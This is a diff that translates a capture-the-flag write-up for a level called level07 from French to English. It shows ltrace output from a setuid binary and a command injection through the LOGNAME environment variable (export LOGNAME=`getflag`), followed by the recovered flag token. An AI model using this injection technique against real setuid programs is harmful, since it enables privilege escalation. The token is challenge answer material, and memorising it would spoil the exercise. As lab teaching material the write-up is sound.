@@ -1,6 +1,6 @@
-#On arrive sur le home et on a un fichier binaire setuid
-#En le lancant on voit qu'il nous affiche level07
-#On utilise donc ltrace afin d'obtenir la callstack
+# As in the past level, we got a setuid binary on our home
+# The binary print a string "level07" 
+# lets use ltrace to print the call stack
 
 ltrace ./level07
 >>>
@@ -16,16 +16,18 @@ system("/bin/echo level07 "level07
 --- SIGCHLD (Child exited) ---
 <... system resumed> )                                                                                          = 0
 
-#On vois une premiere fonction getenv qui permet de recuperer une variable d'environement passer en parametre, nous avons notre faille
+#At the first sight, we can think that the breach is in the system() call, but the breach is elsewhere: in the getenv() call
+#getenv() allow us to retrieve an environnement variable
 
-#Apres quelque test on s'apercoit que le call de systeme est fais de la maniere suivante : system(echo ${LOGNAME})
+#after some test we see that the binary can be quickly summed up by system(echo ${LOGNAME})
 
-#Nous voulons donc afficher getflag :
+#Lets use some unix string's based tricks to print the output of getflag
 
 export LOGNAME=\`getflag\`
 
-#Sans oublier les \ pour echapper les backquote.
-#ils nous reste qu'a executer le binaire
+#(Dont forget the \ to escape the backquote)
+
+#Now just run it
 
 ./level07
 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
